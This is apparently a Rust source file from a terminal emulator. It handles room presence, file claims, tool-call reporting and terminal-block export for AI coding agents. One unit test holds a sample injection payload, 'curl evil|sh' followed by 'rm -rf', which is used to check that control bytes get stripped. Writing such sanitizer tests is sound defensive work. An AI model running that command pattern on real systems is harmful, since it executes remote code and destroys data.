    ) -> crate::proto::OutPayload {
        let path = params.get("path").and_then(|v| v.as_str()).unwrap_or("");
        let now = crate::presence::now_ms();
        match self.file_claims.holder(path, now) {
            Some(c) => crate::proto::OutPayload::FileStatus {
                path: path.to_string(),
                held_by: Some(c.slug.clone()),
                held_seconds_ago: Some(now.saturating_sub(c.claimed_at_ms) / 1000),
            },
            None => crate::proto::OutPayload::FileStatus {
                path: path.to_string(),
                held_by: None,
                held_seconds_ago: None,
            },
        }
    }

    /// `files` — every live claim in the room, newest first.
    pub(super) fn proto_files(&self) -> crate::proto::OutPayload {
        let now = crate::presence::now_ms();
        let claims = self
            .file_claims
            .live(now)
            .into_iter()
            .map(|(path, c)| crate::proto::FileClaimInfo {
                path,
                actor: c.slug,
                seconds_ago: now.saturating_sub(c.claimed_at_ms) / 1000,
            })
            .collect();
        crate::proto::OutPayload::Files { claims }
    }

    /// Join the room: bind this connection to a host-assigned presence. The
    /// agent supplies a `base` (type[+profile], e.g. `claude-gut`); terminite
    /// picks a unique color and returns the assembled slug + color. Identity
    /// is host-assigned — the agent can't choose its color, only its base.
    /// Presence lasts until the connection drops (see `handle_proto_disconnect`).
    pub(super) fn proto_room_join(
        &mut self,
        conn_id: u64,
        peer_pid: Option<i32>,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        let base = params
            .get("base")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or("agent");
        // Pane: prefer what the agent forwarded (`$TERMINITE_PANE` — the fast
        // path, works when the CLI passes env through, e.g. claude), else
        // derive it from the connecting process's ancestry (the floor — works
        // even when the CLI scrubbed the env, e.g. codex).
        let pane = params
            .get("pane")
            .and_then(|v| v.as_u64())
            .or_else(|| peer_pid.and_then(|p| self.pane_from_pid(p)));
        let presence = self.roster.join(conn_id, base, pane);
        self.window.request_redraw();
        crate::proto::OutPayload::Joined {
            actor: presence_to_info(&presence),
        }
    }

    /// Find the tab/pane a connecting process belongs to by walking its PID
    /// ancestry up to a pane shell terminite spawned. The CLI-agnostic floor
    /// for pane detection: an agent's MCP server is a descendant of its pane's
    /// shell, so the shell PID terminite recorded identifies the pane —
    /// regardless of whether the CLI forwarded `TERMINITE_PANE`.
    pub(super) fn pane_from_pid(&self, start: i32) -> Option<u64> {
        let mut all: Vec<&Tab> = Vec::new();
        self.root.as_ref()?.all_tabs(&mut all);
        let shells: std::collections::HashMap<i32, u64> = all
            .iter()
            .map(|t| (t.live_term.shell_pid(), t.id.0))
            .collect();
        let mut pid = start;
        for _ in 0..32 {
            if let Some(&tab_id) = shells.get(&pid) {
                return Some(tab_id);
            }
            match crate::term::proc_ppid(pid) {
                Some(ppid) if ppid > 1 && ppid != pid => pid = ppid,
                _ => return None,
            }
        }
        None
    }

    /// The room roster — who is *present* right now (attendance), each with
    /// its host-assigned color. Distinct from `activities_list` (history).
    pub(super) fn proto_room_who(&self) -> crate::proto::OutPayload {
        crate::proto::OutPayload::RoomWho {
            actors: self
                .roster
                .present(crate::presence::now_ms())
                .iter()
                .map(|p| {
                    let mut info = presence_to_info(p);
                    info.status = self.shown_status(&p.slug);
                    info
                })
                .collect(),
        }
    }

    /// Record a tool call the see-half hook reported from a pane — the
    /// "see" half of the room (others watch your *work*, not just your
    /// messages). Attribution is by pane → roster actor (the agent never
    /// names itself). A pane with no present actor is silently ignored: the
    /// hook fires for every tool call, including from claudes outside the room.
    pub(super) fn proto_tool_emit(
        &mut self,
        peer_pid: Option<i32>,
        params: &serde_json::Value,
    ) -> crate::proto::OutPayload {
        // Pane: the hook forwards `$TERMINITE_PANE` when its CLI lets it
        // (claude); else derive from the connecting hook process's ancestry
        // (codex scrubs the env for hook subprocesses too). Same floor as
        // room_join. Not attributable → drop silently (the hook fires for
        // every tool call, including from agents outside the room).
        let Some(pane) = params
            .get("pane")
            .and_then(|v| v.as_u64())
            .or_else(|| peer_pid.and_then(|p| self.pane_from_pid(p)))
        else {
            return crate::proto::OutPayload::Ok;
        };
        let Some(slug) = self.roster.slug_for_pane(pane) else {
            return crate::proto::OutPayload::Ok;
        };
        let tool = params
            .get("tool")
            .and_then(|v| v.as_str())
            .unwrap_or("tool")
            .to_string();
        let title = params
            .get("title")
            .and_then(|v| v.as_str())
            .unwrap_or(tool.as_str())
            .to_string();
        let agent_name = agent_name_from_slug(&slug);
        // A tool call means this actor is awake → clear its stall watch, stamp
        // its activity (the PTY floor won't inject mid-turn), and mark anything
        // we'd delivered to it as processed (R1 receipt).
        self.delivery_watch.remove(&slug);
        self.last_activity.insert(slug.clone(), std::time::Instant::now());
        self.mark_processed(&slug);
        self.activities.emit(
            slug,
            agent_name,
            crate::activities::ActivityKind::ToolCall { tool },
            crate::activities::ActivityStatus::Completed,
            title,
        );
        self.window.request_redraw();
        crate::proto::OutPayload::Ok
    }

    pub(super) fn proto_list_tabs(&self) -> crate::proto::OutPayload {
        let mut all: Vec<&Tab> = Vec::new();
        self.root.as_ref().expect("pane tree present").all_tabs(&mut all);
        let tabs = all
            .iter()
            .map(|t| crate::proto::TabInfo {
                tab_id: t.id.0,
                title: t.title.clone(),
            })
            .collect();
        crate::proto::OutPayload::Tabs { tabs }
    }

    pub(super) fn proto_list_blocks(&self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let Some(tab_id_u64) = params.get("tab_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid tab_id".into(),
            };
        };
        let tab_id = TabId(tab_id_u64);
        let mut all: Vec<&Tab> = Vec::new();
        self.root.as_ref().expect("pane tree present").all_tabs(&mut all);
        let Some(tab) = all.into_iter().find(|t| t.id == tab_id) else {
            return crate::proto::OutPayload::Error {
                message: format!("no tab with id {tab_id_u64}"),
            };
        };
        let blocks = tab.blocks.iter().map(block_to_info).collect();
        let cursor = tab.blocks.cursor();
        crate::proto::OutPayload::Blocks { blocks, cursor }
    }

    pub(super) fn proto_mutate_tab<F>(&mut self, params: &serde_json::Value, f: F) -> crate::proto::OutPayload
    where
        F: FnOnce(&mut Tab) -> crate::proto::OutPayload,
    {
        let Some(tab_id_u64) = params.get("tab_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid tab_id".into(),
            };
        };
        let tab_id = TabId(tab_id_u64);
        let mut all: Vec<&mut Tab> = Vec::new();
        self.root
            .as_mut()
            .expect("pane tree present")
            .all_tabs_mut(&mut all);
        let Some(tab) = all.into_iter().find(|t| t.id == tab_id) else {
            return crate::proto::OutPayload::Error {
                message: format!("no tab with id {tab_id_u64}"),
            };
        };
        f(tab)
    }

    pub(super) fn proto_set_tag(&mut self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let Some(block_id) = params.get("block_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid block_id".into(),
            };
        };
        let block_id = block_id as u32;
        let Some(tag) = params.get("tag").and_then(|v| v.as_str()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid tag".into(),
            };
        };
        let tag = tag.to_string();
        let payload = self.proto_mutate_tab(params, |tab| {
            if tab.blocks.add_tag(block_id, &tag) {
                crate::proto::OutPayload::Ok
            } else {
                crate::proto::OutPayload::Error {
                    message: format!("could not add tag {tag:?} to block {block_id}"),
                }
            }
        });
        self.window.request_redraw();
        payload
    }

    pub(super) fn proto_remove_tag(&mut self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let Some(block_id) = params.get("block_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid block_id".into(),
            };
        };
        let block_id = block_id as u32;
        let Some(tag) = params.get("tag").and_then(|v| v.as_str()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid tag".into(),
            };
        };
        let tag = tag.to_string();
        let payload = self.proto_mutate_tab(params, |tab| {
            if tab.blocks.remove_tag(block_id, &tag) {
                crate::proto::OutPayload::Ok
            } else {
                crate::proto::OutPayload::Error {
                    message: format!("tag {tag:?} not present on block {block_id}"),
                }
            }
        });
        self.window.request_redraw();
        payload
    }

    pub(super) fn proto_cursor_at(&mut self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let Some(block_id) = params.get("block_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid block_id".into(),
            };
        };
        let block_id = block_id as u32;
        let payload = self.proto_mutate_tab(params, |tab| {
            if tab.blocks.set_cursor(block_id) {
                crate::proto::OutPayload::Ok
            } else {
                crate::proto::OutPayload::Error {
                    message: format!("no block with id {block_id}"),
                }
            }
        });
        self.window.request_redraw();
        payload
    }

    pub(super) fn proto_cursor_clear(&mut self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let payload = self.proto_mutate_tab(params, |tab| {
            tab.blocks.clear_cursor();
            crate::proto::OutPayload::Ok
        });
        self.window.request_redraw();
        payload
    }

    pub(super) fn proto_get_block(&self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let Some(tab_id_u64) = params.get("tab_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid tab_id".into(),
            };
        };
        let Some(block_id_u64) = params.get("block_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid block_id".into(),
            };
        };
        let tab_id = TabId(tab_id_u64);
        let block_id = block_id_u64 as u32;
        let mut all: Vec<&Tab> = Vec::new();
        self.root.as_ref().expect("pane tree present").all_tabs(&mut all);
        let Some(tab) = all.into_iter().find(|t| t.id == tab_id) else {
            return crate::proto::OutPayload::Error {
                message: format!("no tab with id {tab_id_u64}"),
            };
        };
        let Some(block) = tab.blocks.find(block_id) else {
            return crate::proto::OutPayload::Error {
                message: format!("no block with id {block_id} in tab {tab_id_u64}"),
            };
        };
        let command = block_command_text(tab, block).unwrap_or_default();
        let output = block_output_text(tab, block).unwrap_or_default();
        crate::proto::OutPayload::Block {
            block: crate::proto::BlockData {
                info: block_to_info(block),
                command,
                output,
            },
        }
    }

    pub(super) fn proto_export_tab(&self, params: &serde_json::Value) -> crate::proto::OutPayload {
        let Some(tab_id_u64) = params.get("tab_id").and_then(|v| v.as_u64()) else {
            return crate::proto::OutPayload::Error {
                message: "missing or invalid tab_id".into(),
            };
        };
        // Optional `since` — include only blocks with id >= since. Lets
        // the partner stream a session in chunks instead of always
        // exporting from the beginning.
        let since: Option<u32> = params
            .get("since")
            .and_then(|v| v.as_u64())
            .map(|n| n as u32);
        let tab_id = TabId(tab_id_u64);
        let mut all: Vec<&Tab> = Vec::new();
        self.root.as_ref().expect("pane tree present").all_tabs(&mut all);
        let Some(tab) = all.into_iter().find(|t| t.id == tab_id) else {
            return crate::proto::OutPayload::Error {
                message: format!("no tab with id {tab_id_u64}"),
            };
        };
        let blocks: Vec<crate::proto::BlockData> = tab
            .blocks
            .iter()
            .filter(|b| since.is_none_or(|s| b.id >= s))
            .map(|b| crate::proto::BlockData {
                info: block_to_info(b),
                command: block_command_text(tab, b).unwrap_or_default(),
                output: block_output_text(tab, b).unwrap_or_default(),
            })
            .collect();
        crate::proto::OutPayload::Export {
            tab_id: tab_id_u64,
            blocks,
        }
    }

    pub(super) fn proto_stats(&self) -> crate::proto::OutPayload {
        let mut all: Vec<&Tab> = Vec::new();
        self.root
            .as_ref()
            .expect("pane tree present")
            .all_tabs(&mut all);
        let tabs: Vec<crate::proto::TabStats> = all
            .iter()
            .map(|t| crate::proto::TabStats {
                tab_id: t.id.0,
                title: t.title.clone(),
                cols: t.cols,
                rows: t.rows,
                blocks: t.blocks.iter().count(),
                open_block: t.blocks.open_id(),
                cursor_block: t.blocks.cursor(),
                has_image: t.image.is_some(),
            })
            .collect();

        // Frame stats — simple sort to find p99. Sample count caps at
        // `FRAME_TIMER_CAP`, so the sort is O(n log n) on a small n.
        let samples: Vec<f32> = self.frame_samples.iter().copied().collect();
        let (avg_ms, p99_ms, max_ms) = if samples.is_empty() {
            (0.0, 0.0, 0.0)
        } else {
            let sum: f32 = samples.iter().sum();
            let avg = sum / samples.len() as f32;
            let mut sorted = samples.clone();
            sorted.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
            let p99_idx = ((sorted.len() as f32 * 0.99) as usize).min(sorted.len() - 1);
            let p99 = sorted[p99_idx];
            let max = sorted[sorted.len() - 1];
            (avg, p99, max)
        };

        crate::proto::OutPayload::Stats(crate::proto::StatsPayload {
            version: env!("CARGO_PKG_VERSION"),
            peak_rss_bytes: process_rss_peak_bytes(),
            frame: crate::proto::FrameStats {
                frames_observed: self.frame_count,
                recent_samples: samples.len(),
                avg_ms,
                p99_ms,
                max_ms,
            },
            tabs,
            subscriber_connected: self.proto_subscriber.is_some(),
        })
    }

    pub(super) fn proto_emit_event(&mut self, event: crate::proto::EventPayload) {
        let Some((_, out)) = self.proto_subscriber.as_ref() else { return };
        let msg = crate::proto::OutMessage {
            id: 0,
            payload: crate::proto::OutPayload::Event(event),
        };
        if out.try_send(msg).is_err() {
            // Disconnected or queue overflowed — drop the subscriber
            // rather than let it stall the main thread.
            self.proto_subscriber = None;
        }
    }
}

// ── helpers moved from mod.rs ──────────────────────

pub(super) fn block_to_info(b: &crate::blocks::Block) -> crate::proto::BlockInfo {
    crate::proto::BlockInfo {
        id: b.id,
        exit_code: b.exit_code,
        prompt_line: b.prompt_line,
        command_end_line: b.command_end_line,
        output_start_line: b.output_start_line,
        output_end_line: b.output_end_line,
        tags: b.tags.clone(),
    }
}

/// Extract the command text for a block, converting from session-absolute
/// line coordinates back to alacritty's `Line` frame using the current
/// `history_size`. Returns `None` if the block lacks the marks needed to
/// bracket a range (e.g. `C` arrived without `A`).
pub(super) fn block_command_text(tab: &Tab, block: &crate::blocks::Block) -> Option<String> {
    let start_abs = block.prompt_line?;
    // Prefer the explicit command-end mark; fall back to output-start.
    let end_abs = block.command_end_line.or(block.output_start_line)?;
    if end_abs < start_abs {
        return None;
    }
    let (_, history) = tab.live_term.offset_and_history();
    let start_line = start_abs - history as i32;
    let end_line = end_abs - history as i32;
    let max_col = tab.cols.saturating_sub(1);
    Some(
        tab.live_term
            .extract_text((start_line, 0), (end_line, max_col)),
    )
}

/// Extract the output text for a closed block. An open block returns
/// `None` — the AI should wait for the `block_closed` event, then ask.
///
/// Shells fire `D` *after* the trailing newline of the last output line,
/// so `output_end_line` is the row the cursor advanced to — which the
/// next prompt then takes. Trim that off; otherwise every block's
/// `.output` leaks the next block's `demo$ ...` line. Same trim Bundle 4
/// applies to Cmd-click block selection.
pub(super) fn block_output_text(tab: &Tab, block: &crate::blocks::Block) -> Option<String> {
    let start_abs = block.output_start_line?;
    let end_abs = block.output_end_line?;
    if end_abs <= start_abs {
        // C and D fired on the same row — the command produced no
        // output rows before finishing. Empty string, not `None` —
        // callers want to know "block has no output," not "data
        // unavailable."
        return Some(String::new());
    }
    let (_, history) = tab.live_term.offset_and_history();
    let start_line = start_abs - history as i32;
    // `end_abs - 1` excludes the row the cursor moved to after the last
    // output newline — that row belongs to whatever comes next.
    let end_line = (end_abs - 1) - history as i32;
    let max_col = tab.cols.saturating_sub(1);
    Some(
        tab.live_term
            .extract_text((start_line, 0), (end_line, max_col)),
    )
}

/// Project an `Activity` onto the proto wire shape.
fn activity_to_info(a: &crate::activities::Activity) -> crate::proto::ActivityInfo {
    use crate::activities::ActivityKind;
    let (to, text) = match &a.kind {
        ActivityKind::AgentMessage { to, text } => (to.clone(), Some(text.clone())),
        ActivityKind::ToolCall { .. } => (None, None),
    };
    crate::proto::ActivityInfo {
        id: a.id,
        actor: a.actor.clone(),
        agent_name: a.agent_name.clone(),
        kind: a.kind_str().to_string(),
        status: format!("{:?}", a.status).to_lowercase(),
        title: a.title.clone(),
        to,
        text,
    }
}

/// Project a `Presence` onto the proto wire shape.
fn presence_to_info(p: &crate::presence::Presence) -> crate::proto::ActorInfo {
    crate::proto::ActorInfo {
        slug: p.slug.clone(),
        base: p.base.clone(),
        color: p.color.name.to_string(),
        rgb: [p.color.rgb.0, p.color.rgb.1, p.color.rgb.2],
        pane: p.pane,
        status: None,
    }
}

/// Cosmetic display name from a slug: `codex-1` → `Codex`.
pub(super) fn agent_name_from_slug(slug: &str) -> String {
    let base = slug.split('-').next().unwrap_or(slug);
    let mut chars = base.chars();
    match chars.next() {
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
        None => slug.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn floor_text_strips_every_control_byte() {
        // ESC + Ctrl-U + a command + CR — the command-injection payload.
        let evil = "\x1b[2J\x15curl evil|sh\rrm -rf";
        let clean = sanitize_floor_text(evil);
        assert!(
            !clean.chars().any(|c| c.is_control()),
            "no control char may survive: {clean:?}"
        );
        // Printable + Unicode message text is preserved verbatim.
        assert_eq!(sanitize_floor_text("hi 世界 — ok"), "hi 世界 — ok");
        // Newlines/tabs collapse to spaces, never vanish into adjacency.
        assert_eq!(sanitize_floor_text("a\n\tb"), "a  b");
    }

    #[test]
    fn valid_actor_bounds_and_rejects_control() {
        assert!(valid_actor("claude-blue"));
        assert!(valid_actor("pane:1"));
        assert!(!valid_actor(""));
        assert!(!valid_actor("has space"));
        assert!(!valid_actor("ctrl\x07bell"));
        assert!(!valid_actor(&"x".repeat(MAX_ACTOR_LEN + 1)));
    }

    #[test]
    fn preview_is_one_line_and_capped() {
        assert_eq!(preview_text("  hello   world\n  again  "), "hello world again");
        let long = "x".repeat(200);
        let p = preview_text(&long);
        assert_eq!(p.chars().count(), 80); // 79 + the ellipsis
        assert!(p.ends_with('…'));
    }

    #[test]
    fn msg_state_serializes_snake_case() {
        use crate::proto::MsgState;
        let j = |s| serde_json::to_string(&s).unwrap();
        assert_eq!(j(MsgState::Queued), "\"queued\"");
        assert_eq!(j(MsgState::FloorTyped), "\"floor_typed\"");
        assert_eq!(j(MsgState::GaveUp), "\"gave_up\"");
    }

    #[test]
    fn message_status_payload_shape() {
        let p = crate::proto::OutPayload::MessageStatus {
            message_id: 7,
            state: crate::proto::MsgState::Read,
            from: "claude-blue".into(),
            to: Some("kimi-red".into()),
        };
        let v: serde_json::Value =
            serde_json::from_str(&serde_json::to_string(&p).unwrap()).unwrap();
        assert_eq!(v["kind"], "message_status");
        assert_eq!(v["message_id"], 7);
        assert_eq!(v["state"], "read");
        assert_eq!(v["to"], "kimi-red");
    }
}


